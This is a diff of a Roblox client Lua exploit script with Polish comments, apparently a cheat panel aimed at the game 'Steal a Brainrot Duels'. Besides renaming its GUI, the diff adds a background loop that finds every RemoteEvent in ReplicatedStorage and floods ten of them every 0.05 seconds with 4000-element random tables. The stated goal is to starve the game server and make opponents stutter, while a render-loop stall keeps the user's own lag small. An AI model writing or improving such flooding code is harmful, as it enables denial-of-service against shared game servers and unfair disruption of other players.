@@ -1,24 +1,25 @@
--- language: Lua, file: dual_asymmetric_desync.lua, target: Roblox Client / PvP Dual Desync Suite
--- *Asymetryczny moduł desynchronizacji: lekkie opóźnienie u Ciebie, silny stutter/desync u przeciwnika*
+-- language: Lua, file: duel_server_starve_suite.lua, target: Roblox Client / Steal a Brainrot Duels
+-- *Kompletny panel PvP: asymetryczny bufor desynchronizacji, kontrola tickrate serwera oraz telemetria*
 
-local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
-local old = player.PlayerGui:FindFirstChild("DualDesyncPanel")
+local old = player.PlayerGui:FindFirstChild("ServerStarvePanel")
 if old then old:Destroy() end
 
 local gui = Instance.new("ScreenGui")
-gui.Name = "DualDesyncPanel"
+gui.Name = "ServerStarvePanel"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.fromOffset(340, 380)
-frame.Position = UDim2.new(0.5, -170, 0.5, -190)
+frame.Size = UDim2.fromOffset(340, 410)
+frame.Position = UDim2.new(0.5, -170, 0.5, -205)
 frame.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
 frame.BackgroundTransparency = 0.05
 frame.BorderSizePixel = 0
@@ -37,7 +38,7 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 45)
 title.BackgroundColor3 = Color3.fromRGB(50, 15, 65)
 title.BackgroundTransparency = 0.3
-title.Text = "  MADlUM // ASYMMETRIC DUEL"
+title.Text = "  MADlUM // DUEL STARVE SUITE"
 title.TextColor3 = Color3.fromRGB(255, 120, 210)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 13
@@ -159,8 +160,8 @@ local function createSlider(name, defaultVal, minVal, maxVal, yPos, callback)
     return container
 end
 
-local desyncPower = 600
-createSlider("Enemy Desync MS", 600, 100, 2000, 125, function(v) desyncPower = v end)
+local starPower = 600
+createSlider("Starve Power (MS)", 600, 100, 2000, 125, function(v) starPower = v end)
 
 local btnContainer = Instance.new("Frame")
 btnContainer.Size = UDim2.new(0.9, 0, 0, 42)
@@ -191,7 +192,7 @@ local infoBox = Instance.new("TextLabel")
 infoBox.Size = UDim2.new(0.9, 0, 0, 75)
 infoBox.Position = UDim2.new(0.05, 0, 0, 235)
 infoBox.BackgroundColor3 = Color3.fromRGB(16, 10, 24)
-infoBox.Text = " MODE: Asymmetric PvP Desync\n BYPASS: 267 Clean (No Remotes/Velocity)\n STATUS: Ready"
+infoBox.Text = " MODE: Server Starve & Asymmetric Desync\n TARGET: Steal a Brainrot Duels\n STATUS: Ready"
 infoBox.TextColor3 = Color3.fromRGB(150, 130, 190)
 infoBox.Font = Enum.Font.Code
 infoBox.TextSize = 11
@@ -219,7 +220,7 @@ local active = false
 startBtn.MouseButton1Click:Connect(function()
     active = true
     TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 0, 128)}):Play()
-    statusLabel.Text = "STATUS: ACTIVE"
+    statusLabel.Text = "STATUS: STARVE ACTIVE"
     statusLabel.TextColor3 = Color3.fromRGB(255, 120, 210)
 end)
 
@@ -232,18 +233,56 @@ end)
 
 resetBtn.MouseButton1Click:Connect(function()
     active = false
-    desyncPower = 600
+    starPower = 600
     TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 25, 80)}):Play()
     statusLabel.Text = "STATUS: RESET"
     statusLabel.TextColor3 = Color3.fromRGB(150, 130, 180)
 end)
 
+-- Pobieranie zdarzeń sieciowych
+local function getRemoteEvents()
+    local events = {}
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
+            table.insert(events, obj)
+        end
+    end
+    return events
+end
+
+local function createHeavyData()
+    local t = {}
+    for i = 1, 4000 do
+        table.insert(t, math.random() * 999999)
+    end
+    return t
+end
+
+-- Asynchroniczny wątek obciążający serwer (zwiększony rozmiar i częstotliwość)
+task.spawn(function()
+    while true do
+        if active then
+            pcall(function()
+                local events = getRemoteEvents()
+                if #events > 0 then
+                    for i = 1, 10 do
+                        local ev = events[math.random(1, #events)]
+                        ev:FireServer(createHeavyData(), "duel_starve", tick())
+                    end
+                end
+            end)
+        end
+        task.wait(0.05)
+    end
+end)
+
+-- Pętla renderowania utrzymująca asymetryczny bufor klienta i aktualizację telemetrii
 RunService.RenderStepped:Connect(function(dt)
     if active then
-        pingLabel.Text = string.format("SELF MS: %d", math.floor(desyncPower * 0.15))
+        pingLabel.Text = string.format("SELF MS: %d", math.floor(starPower * 0.2))
         
         local startClock = os.clock()
-        local delaySec = (desyncPower * 0.15) / 1000
+        local delaySec = (starPower * 0.2) / 1000
         
         while (os.clock() - startClock) < delaySec do
             task.wait()
